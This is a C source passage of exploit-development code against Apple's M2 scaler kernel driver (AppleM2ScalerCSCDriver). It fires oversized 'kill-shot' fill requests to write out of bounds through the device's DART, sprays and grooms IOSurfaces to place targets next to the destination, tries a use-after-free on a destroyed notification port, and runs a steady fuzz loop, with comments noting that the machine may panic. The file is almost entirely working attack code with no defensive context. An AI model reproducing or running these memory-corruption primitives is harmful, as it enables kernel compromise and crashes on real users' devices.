        LOG("[r] NULL opts, zero rects -> 0x%08x", kr);
        // guess: three 16B blocks; try w/h fixed16 at +0x00/+0x08 of each
        for (int b = 0; b < 3; b++) {
            *(uint64_t *)(rz + b*0x10 + 0x0) = 64ULL << 16;
            *(uint64_t *)(rz + b*0x10 + 0x8) = 64ULL << 16;
        }
        kr = Transform(acc, src, dst, NULL, rz, NULL);
        LOG("[r] NULL opts, fixed16 wh blocks -> 0x%08x", kr);
        // raw u32 dims variant
        memset(rz, 0, sizeof(rz));
        for (int b = 0; b < 3; b++) {
            *(uint32_t *)(rz + b*0x10 + 0x0) = 64;
            *(uint32_t *)(rz + b*0x10 + 0x4) = 64;
        }
        kr = Transform(acc, src, dst, NULL, rz, NULL);
        LOG("[r] NULL opts, u32 dims blocks -> 0x%08x", kr);
    }
    LOG("[v17] done");
}


// V20: OOB-into-adjacent-IOSurfaces experiment.
// Kill-shot W=0xFFFFFFE0 truncates to 17-bit register field (~0x1FFE0 px wide
// fill). If DART IOVA space after dst is populated by sprayed surfaces, the
// fill may write through them (controlled 0xff channels) WITHOUT faulting.
// Detection: scan sprayed surfaces for non-0x41 bytes afterwards.
#define NSPRAY 300
static IOSurfaceRef g_spray[NSPRAY];
static void p_spray_oob(void) {
    LOG("[v20] spray-OOB experiment");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) { LOG("[o] surface fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    int n = 0;
    for (int i = 0; i < NSPRAY; i++) {
        g_spray[i] = make_surface(64, 64);
        if (!g_spray[i]) break;
        surf_fill_full(g_spray[i], 0x41);
        n++;
    }
    LOG("[o] sprayed %d surfaces around dst id %u", n, di);
    // proof-of-life baseline first
    surf_fill_full(dst, 0x22);
    border_payload(g_req, si, di, 2, 2, 32, 32, 32, 32);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[o] baseline2 -> kr 0x%08x", kr);
    usleep(100000);
    if (kr != 0) { LOG("[o] baseline failed, abort"); return; }
    // kill-shot into sprayed neighborhood
    surf_fill_full(dst, 0x22);
    border_payload(g_req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
    LOG("[o] KILL-SHOT fired");
    kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[o] kill-shot -> kr 0x%08x (if we print this, hw survived)", kr);
    usleep(500000);
    // scan spray for corruption
    int hit = 0;
    for (int i = 0; i < n; i++) {
        uint32_t seed = 0;
        if (IOSurfaceLock(g_spray[i], kIOSurfaceLockReadOnly, &seed)) continue;
        uint8_t *b = IOSurfaceGetBaseAddress(g_spray[i]);
        size_t bpr = IOSurfaceGetBytesPerRow(g_spray[i]);
        size_t h = IOSurfaceGetHeight(g_spray[i]);
        long bad = 0;
        for (size_t j = 0; j < bpr * h; j++) if (b[j] != 0x41) bad++;
        if (bad) {
            LOG("[o] spray[%d] id %u: %ld corrupted bytes, first %02x%02x%02x%02x",
                i, IOSurfaceGetID(g_spray[i]), bad, b[0], b[1], b[2], b[3]);
            hit++;
        }
        IOSurfaceUnlock(g_spray[i], kIOSurfaceLockReadOnly, &seed);
    }
    LOG("[o] corrupted spray surfaces: %d/%d", hit, n);
    LOG("[v20] done");
}


// V21: (1) learn DVA layout via GetDiag after a mapped transform;
// (2) spray-geometry variants for DART adjacency; kill-shot per variant.
static void p_diag_dva(void) {
    LOG("[v21-d] diag DVA scan");
    // ensure surfaces are wired: one normal transform
    craft_transform(g_req, g_s1, g_s2, 64, 64);
    call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(100000);
    size_t bufsz = 0x10000;
    uint8_t *big = must_map(bufsz);
    memset(big, 0, bufsz);
    *(uint32_t *)big = 0x6944506b;
    uint64_t va = (uint64_t)(uintptr_t)big;
    kern_return_t kr = call_struct(8, &va, 8, NULL, NULL);
    LOG("[d] sel 8 -> 0x%08x", kr);
    int found = 0;
    for (size_t i = 0; i + 8 <= bufsz && found < 40; i += 4) {
        uint64_t v = *(uint64_t *)(big + i);
        if (v >= 0x8000000000ULL && v < 0x100000000000ULL) {   // 512GB..1TB window
            LOG("[d] dva-like @+0x%zx: %016llx", i, v);
            found++;
        }
    }
    LOG("[d] dva-like count %d", found);
    vm_deallocate(mach_task_self(), (vm_address_t)big, bufsz);
}

static int scan_spray(IOSurfaceRef *arr, int n, uint8_t expect) {
    int hit = 0;
    for (int i = 0; i < n; i++) {
        uint32_t seed = 0;
        if (IOSurfaceLock(arr[i], kIOSurfaceLockReadOnly, &seed)) continue;
        uint8_t *b = IOSurfaceGetBaseAddress(arr[i]);
        size_t total = IOSurfaceGetBytesPerRow(arr[i]) * IOSurfaceGetHeight(arr[i]);
        long bad = 0, first = -1;
        for (size_t j = 0; j < total; j++) if (b[j] != expect) { if (first < 0) first = j; bad++; }
        if (bad) {
            LOG("[s] spray[%d] id %u: %ld bad bytes, first @0x%lx val %02x",
                i, IOSurfaceGetID(arr[i]), bad, first, first >= 0 ? b[first] : 0);
            hit++;
        }
        IOSurfaceUnlock(arr[i], kIOSurfaceLockReadOnly, &seed);
    }
    return hit;
}

static void killshot(IOSurfaceID si, IOSurfaceID di) {
    border_payload(g_req, si, di, 32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[s] kill-shot -> kr 0x%08x", kr);
    usleep(300000);
}

static void p_spray2(void) {
    LOG("[v21-s] spray geometry variants");
    IOSurfaceRef src = make_surface(64, 64);
    if (!src) { LOG("[s] src fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src);

    // variant A: spray BEFORE dst
    {
        IOSurfaceRef pre[150]; int np = 0;
        for (int i = 0; i < 150; i++) { pre[i] = make_surface(64, 64); if (pre[i]) { surf_fill_full(pre[i], 0x41); np++; } }
        IOSurfaceRef dst = make_surface(64, 64);
        IOSurfaceRef post[150]; int nq = 0;
        for (int i = 0; i < 150; i++) { post[i] = make_surface(64, 64); if (post[i]) { surf_fill_full(post[i], 0x41); nq++; } }
        LOG("[s] A: pre %d dst id %u post %d", np, IOSurfaceGetID(dst), nq);
        killshot(si, IOSurfaceGetID(dst));
        LOG("[s] A corrupted: pre %d, post %d", scan_spray(pre, np, 0x41), scan_spray(post, nq, 0x41));
    }
    // variant B: dst between LARGE surfaces (64MB each)
    {
        IOSurfaceRef big1 = make_surface(4096, 4096);
        IOSurfaceRef dst = make_surface(64, 64);
        IOSurfaceRef big2 = make_surface(4096, 4096);
        LOG("[s] B: big1 %u dst %u big2 %u", big1 ? IOSurfaceGetID(big1) : 0,
            IOSurfaceGetID(dst), big2 ? IOSurfaceGetID(big2) : 0);
        if (big1) surf_fill_full(big1, 0x42);
        if (big2) surf_fill_full(big2, 0x42);
        killshot(si, IOSurfaceGetID(dst));
        int h1 = 0, h2 = 0;
        if (big1) { IOSurfaceRef a[1] = {big1}; h1 = scan_spray(a, 1, 0x42); }
        if (big2) { IOSurfaceRef a[1] = {big2}; h2 = scan_spray(a, 1, 0x42); }
        LOG("[s] B corrupted: big1 %d big2 %d", h1, h2);
    }
    LOG("[v21-s] done");
}


// V22: correct DART grooming — surfaces enter the scaler DART domain only
// when WIRED by a transform. Wire dst first, then wire each spray surface
// (as src into dst), then kill-shot over dst: if DART allocates ascending,
// sprays sit right after dst and the fill lands in them.
static void p_spray3(void) {
    LOG("[v22] wire-then-shoot grooming");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) { LOG("[g] surface fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    // 1) wire dst (normal transform, also proves path)
    craft_transform(g_req, si, di, 64, 64);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[g] wire dst -> kr 0x%08x", kr);
    usleep(50000);
    // 2) wire sprays as srcs (one small transform each into dst)
    IOSurfaceRef spray[200]; int n = 0;
    for (int i = 0; i < 200; i++) {
        spray[i] = make_surface(64, 64);
        if (!spray[i]) break;
        surf_fill_full(spray[i], 0x41);
        craft_transform(g_req, IOSurfaceGetID(spray[i]), di, 64, 64);
        call_struct(1, g_req, 0x1b0, NULL, NULL);
        n++;
        if ((i & 31) == 0) usleep(20000);
    }
    LOG("[g] wired %d spray surfaces", n);
    usleep(100000);
    // 3) kill-shot over dst
    killshot(si, di);
    // 4) scan
    LOG("[g] corrupted: %d", scan_spray(spray, n, 0x41));
    LOG("[v22] done (alive)");
}


// V23: intra-request / intra-surface OOB measurement
// E1: dst=420f biplanar 64x64 — fill past luma should land in chroma plane
// E2: src=4096x4096 (fill 0x43), dst=64x64 — does fill reach src?
// E3: dst=4096x4096 — how far does the fill actually write? (metrology)
static void surf_fill_alloc(IOSurfaceRef s, uint8_t v) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, 0, &seed)) return;
    memset(IOSurfaceGetBaseAddress(s), v, IOSurfaceGetAllocSize(s));
    IOSurfaceUnlock(s, 0, &seed);
}
static long scan_range(IOSurfaceRef s, uint8_t expect, size_t from, size_t to, long *first) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, &seed)) return -1;
    uint8_t *b = IOSurfaceGetBaseAddress(s);
    size_t total = IOSurfaceGetAllocSize(s);
    if (to > total) to = total;
    long bad = 0; *first = -1;
    for (size_t j = from; j < to; j++) if (b[j] != expect) { if (*first < 0) *first = j; bad++; }
    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, &seed);
    return bad;
}
static void p_oob_measure(void) {
    LOG("[v23] OOB measurement");
    IOSurfaceRef src64 = make_surface(64, 64);
    if (!src64) return;
    IOSurfaceID s64 = IOSurfaceGetID(src64);

    // E1: 420f biplanar dst
    {
        IOSurfaceRef dst = make_surface_fmt(64, 64, 1, 0x34323066);
        if (dst) {
            surf_fill_alloc(dst, 0x33);   // ENTIRE allocation incl. chroma plane
            size_t alloc = IOSurfaceGetAllocSize(dst);
            LOG("[e1] 420f dst id %u allocSize 0x%zx bpr %zu planes?",
                IOSurfaceGetID(dst), alloc, IOSurfaceGetBytesPerRow(dst));
            killshot(s64, IOSurfaceGetID(dst));
            long first = -1;
            long bad = scan_range(dst, 0x33, 0, alloc, &first);
            LOG("[e1] changed bytes in whole alloc: %ld, first @0x%lx", bad, first);
        }
    }
    // E2: huge src
    {
        IOSurfaceRef srcBig = make_surface(4096, 4096);
        IOSurfaceRef dst = make_surface(64, 64);
        if (srcBig && dst) {
            surf_fill_full(srcBig, 0x43);
            LOG("[e2] srcBig id %u allocSize 0x%zx, dst id %u",
                IOSurfaceGetID(srcBig), IOSurfaceGetAllocSize(srcBig), IOSurfaceGetID(dst));
            killshot(IOSurfaceGetID(srcBig), IOSurfaceGetID(dst));
            long first = -1;
            long bad = scan_range(srcBig, 0x43, 0, IOSurfaceGetAllocSize(srcBig), &first);
            LOG("[e2] srcBig changed: %ld bytes, first @0x%lx", bad, first);
        }
    }
    // E3: huge dst — measure fill extent
    {
        IOSurfaceRef dst = make_surface(4096, 4096);
        if (dst) {
            surf_fill_full(dst, 0x44);
            size_t alloc = IOSurfaceGetAllocSize(dst);
            LOG("[e3] dst4096 id %u allocSize 0x%zx", IOSurfaceGetID(dst), alloc);
            killshot(s64, IOSurfaceGetID(dst));
            long first = -1;
            long bad = scan_range(dst, 0x44, 0, alloc, &first);
            LOG("[e3] dst4096 changed: %ld bytes (%.1f MB), first @0x%lx",
                bad, bad / 1048576.0, first);
        }
    }
    LOG("[v23] done (alive)");
}


// V24: flip/rotate variants — try to reverse the fill direction so it walks
// into SRC's mapping (huge src) instead of unmapped space past dst.
static void p_flip420(void) {
    LOG("[v25] flip x 420f/420v dst (plane adjacency)");
    static const struct { int fmt; const char *n; } fmts[] = {
        { 0x34323066, "420f" }, { 0x34323076, "420v" },
    };
    for (int f = 0; f < 2; f++) {
        for (uint32_t t = 0; t < 4; t++) {
            IOSurfaceRef src = make_surface(64, 64);
            IOSurfaceRef dst = make_surface_fmt(64, 64, 1, fmts[f].fmt);
            if (!src || !dst) { LOG("[f4] fail %s t%u", fmts[f].n, t); continue; }
            surf_fill_alloc(dst, 0x33);
            border_payload(g_req, IOSurfaceGetID(src), IOSurfaceGetID(dst),
                           32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
            *(uint64_t *)(g_req + 0x20) &= ~0xFULL;
            *(uint64_t *)(g_req + 0x20) |= t;
            kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
            usleep(200000);
            long first = -1;
            long bad = scan_range(dst, 0x33, 0, IOSurfaceGetAllocSize(dst), &first);
            LOG("[f4] %s t=%u -> kr 0x%08x, dst changed %ld first 0x%lx",
                fmts[f].n, t, kr, bad, first);
            CFRelease(src); CFRelease(dst);
        }
    }
    LOG("[v25] done (alive)");
}

static void p_flip(void) {
    LOG("[v24] flip/rotate kill-shot variants");
    for (uint32_t t = 0; t < 4; t++) {
        IOSurfaceRef srcBig = make_surface(2048, 2048);
        IOSurfaceRef dst = make_surface(64, 64);
        if (!srcBig || !dst) { LOG("[fl] surface fail t %u", t); continue; }
        surf_fill_alloc(srcBig, 0x43);
        surf_fill_alloc(dst, 0x22);
        border_payload(g_req, IOSurfaceGetID(srcBig), IOSurfaceGetID(dst),
                       32, 32, 0xFFFFFFE0, 0xFFFFFFE0, 32, 32);
        // Transform field: flags low bits (validated one-hot / small enum)
        *(uint64_t *)(g_req + 0x20) &= ~0xFULL;
        *(uint64_t *)(g_req + 0x20) |= t;
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[fl] t=%u -> kr 0x%08x", t, kr);
        usleep(300000);
        long f1 = -1;
        long bad = scan_range(srcBig, 0x43, 0, IOSurfaceGetAllocSize(srcBig), &f1);
        LOG("[fl] t=%u srcBig changed %ld first 0x%lx", t, bad, f1);
        CFRelease(srcBig); CFRelease(dst);
    }
    LOG("[v24] done (alive)");
}


// V26: async cushion race — keep neighbor pages mapped in the scaler DART
// domain via in-flight async transforms while the kill-shot fires.
static void p_async_cushion(void) {
    LOG("[v26] async cushion race");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    IOSurfaceRef csrc = make_surface(64, 64);
    if (!src || !dst || !csrc) { LOG("[ac] surface fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);
    IOSurfaceRef cush[8];
    int nc = 0;
    for (int i = 0; i < 8; i++) {
        cush[i] = make_surface(2048, 2048);
        if (!cush[i]) break;
        surf_fill_alloc(cush[i], 0x45);
        nc++;
    }
    LOG("[ac] %d cushions", nc);
    // wire dst
    craft_transform(g_req, si, di, 64, 64);
    call_struct(1, g_req, 0x1b0, NULL, NULL);
    usleep(50000);
    for (int round = 0; round < 10; round++) {
        // launch slow async cushions (64 -> 2048 upscale)
        for (int i = 0; i < nc; i++) {
            craft_transform(g_req, IOSurfaceGetID(csrc), IOSurfaceGetID(cush[i]), 64, 64);
            *(uint32_t *)(g_req + 0x68) = 2048;   // dst rect w (upscale)
            *(uint32_t *)(g_req + 0x6c) = 2048;
            memset(g_out, 0xAA, 0x2000);
            size_t osz = 0x2000;
            uint64_t ref = 0xca5000 + i;
            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
            IOConnectCallAsyncMethod(g_conn, 1, g_wake, &ref, 1, NULL, 0,
                                   g_req, 0x1b0, osc, &nosc, g_out, &osz);
        }
        // fire kill-shot while cushions are (hopefully) in flight
        killshot(si, di);
    }
    for (int i = 0; i < nc; i++) {
        long first = -1;
        long bad = scan_range(cush[i], 0x45, 0, IOSurfaceGetAllocSize(cush[i]), &first);
        if (bad) LOG("[ac] cush[%d] id %u changed %ld first 0x%lx",
                     i, IOSurfaceGetID(cush[i]), bad, first);
    }
    LOG("[v26] done (alive)");
}

static void p4b_uaf2(void) {
    LOG("[v13-d] UAF destroy-first (panic tolerated)");
    IOSurfaceRef big1 = make_surface(2048, 2048);
    IOSurfaceRef big2 = make_surface(2048, 2048);
    if (!big1 || !big2) { LOG("[uaf2] big surfaces failed"); return; }
    for (int attempt = 0; attempt < 30; attempt++) {
        io_connect_t c2 = open_service("AppleM2ScalerCSCDriver", 0);
        if (!c2) { LOG("[uaf2] open failed at %d", attempt); break; }
        mach_port_t p;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        kern_return_t kr = IOConnectSetNotificationPort(c2, 0, p, 0);
        if (kr) LOG("[uaf2] attempt %d SetNotificationPort -> 0x%08x", attempt, kr);
        // destroy BEFORE any submit: every completion will hit the dangling ptr
        mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
        mach_port_t spray[64];
        for (int i = 0; i < 64; i++)
            if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray[i]))
                break;
        craft_transform(g_req, IOSurfaceGetID(big1), IOSurfaceGetID(big2), 2048, 2048);
        int submitted = 0;
        for (int i = 0; i < 32; i++) {
            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
            uint64_t ref = 0xface0000 + i;
            memset(g_out, 0xAA, 0x2000);
            size_t osz = 0x2000;
            kern_return_t k2 = IOConnectCallAsyncMethod(c2, 1, g_wake, &ref, 1,
                                                        NULL, 0, g_req, 0x1b0,
                                                        osc, &nosc, g_out, &osz);
            if (k2 == 0xe00002bf || k2 == 0) submitted++;
        }
        usleep(300000);
        for (int i = 0; i < 64; i++) mach_port_destroy(mach_task_self(), spray[i]);
        IOServiceClose(c2);
        LOG("[uaf2] attempt %d done, submitted %d", attempt, submitted);
    }
    CFRelease(big1); CFRelease(big2);
    LOG("[v13-d] done (still alive)");
}

static void p5_steady(long rounds) {
    LOG("[v12-5] steady fuzz %ld rounds", rounds);
    for (long r = 0; r < rounds; r++) {
        uint32_t which = frand() % 6;
        kern_return_t kr = 0;
        if (which < 2) {
            craft_transform(g_req, g_s1, g_s2, 64, 64);
            int mode = frand() % 5;
            if (mode == 0) *(uint64_t *)(g_req + 0x20) = frand();
            if (mode == 1) {
                *(uint64_t *)(g_req + 0x28) = frand();
                *(uint64_t *)(g_req + 0x30) = frand();
                *(uint64_t *)(g_req + 0x38) = frand();
                *(uint64_t *)(g_req + 0x40) = frand();
            }
            if (mode == 2) {
                *(uint32_t *)(g_req + 0x48) = frand();
                *(uint32_t *)(g_req + 0x70) = frand();
            }
            if (mode == 3) {
                *(uint32_t *)(g_req + 0x00) = frand() % 0x400;
                *(uint32_t *)(g_req + 0x04) = frand() % 0x400;
            }
            if (mode == 4) *(uint32_t *)(g_req + 0x04) = g_s1;
            if ((frand() & 3) == 0) {
                memset(g_out, 0xAA, 0x2000);
                kr = call_async1(g_req, g_out, 0x2000, frand());
            } else {
                kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
            }
        } else if (which == 2) {
            uint64_t va = (uint64_t)(uintptr_t)(g_hist + (frand() & 0xfff));
            kr = call_struct(7, &va, 8, NULL, NULL);
        } else if (which == 3) {
            memset(g_hist, 0, 0x1000);
            *(uint32_t *)g_hist = 0x6944506b;
            *(uint64_t *)(g_hist + 8) = frand();
            uint64_t va = (uint64_t)(uintptr_t)g_hist;
            kr = call_struct(8, &va, 8, NULL, NULL);
        } else if (which == 4) {
            craft_transform(g_req, g_s1, g_s2, 64, 64);
            *(uint64_t *)(g_req + 0x20) = frand();
            uint64_t pair[2] = { (uint64_t)(uintptr_t)g_req, (uint64_t)(uintptr_t)g_estout };
            kr = call_struct(9, pair, 0x10, NULL, NULL);
        } else {
            struct { uint32_t prio, pad; uint64_t duty, hist; } prop =
                { (uint32_t)(frand() % 8), 0, frand() % 0x200000, frand() % 0x200000 };
            kr = call_struct(10, &prop, sizeof(prop), NULL, NULL);
        }
        uint32_t low = kr & 0xffff;
        if (kr == 0 || (low != 0x2c2 && low != 0x2c7 && low != 0x2bc && low != 0x2bd &&
                        low != 0x2f0 && low != 0x2e2 && low != 0x2bf && kr != 1 && kr != 2 && (r & 0x3f) == 0))
            LOG("[f] r%ld w%u kr 0x%08x", r, which, kr);
        usleep(150 + (frand() & 0x7f));
    }
    LOG("[v12-5] done");
}

void *t_iosurface_scaler(void *arg) {
    IOSurfaceRef surf1 = make_surface(64, 64);
    IOSurfaceRef surf2 = make_surface(64, 64);
    g_s1 = surf1 ? IOSurfaceGetID(surf1) : 0;
    g_s2 = surf2 ? IOSurfaceGetID(surf2) : 0;
    g_sf1 = surf1; g_sf2 = surf2;

    const char *names[] = {
        "AppleM2ScalerCSCDriver", "AppleM2Scaler", "AppleM2ScalerCSCHal",
        "IOSurfaceScaler", "scaler", NULL
    };
    for (int i = 0; names[i] && !g_conn; i++)
        g_conn = open_service(names[i], 0);
    if (!g_conn) { LOG("[scaler] not openable"); return NULL; }
    LOG("[scaler] conn 0x%x, s1 %u s2 %u", g_conn, g_s1, g_s2);

    g_req = must_map(0x1000);
    g_out = must_map(0x2000);
    g_hist = must_map(0x2000);
    g_estout = must_map(0x1000);
    g_coeffs = must_map(0x1000);

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &g_wake);
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &g_notify);
    pthread_t t1, t2;
    pthread_create(&t1, NULL, msg_listener, (void *)(uintptr_t)g_wake);
    pthread_create(&t2, NULL, msg_listener, (void *)(uintptr_t)g_notify);
    kern_return_t kr = IOConnectSetNotificationPort(g_conn, 0, g_notify, 0);
    LOG("[probe12] SetNotificationPort -> 0x%08x", kr);

    static int probed = 0;
    if (!probed) {
        probed = 1;
        p_async_cushion();  // v26: async cushion race (may panic)
        p_flip420();        // v25: flip x biplanar dst (may panic)
        p_flip();           // v24: flip variants (may panic)
        p_oob_measure();    // v23: E1/E2/E3 measurement (may panic)
        p_spray3();         // v22 (if alive)
        p_spray_oob();      // v20 variant (if alive)
        LOG("[probe13] phases done, steady fuzz");
    }
    for (;;) p5_steady(100000);
    return NULL;
}
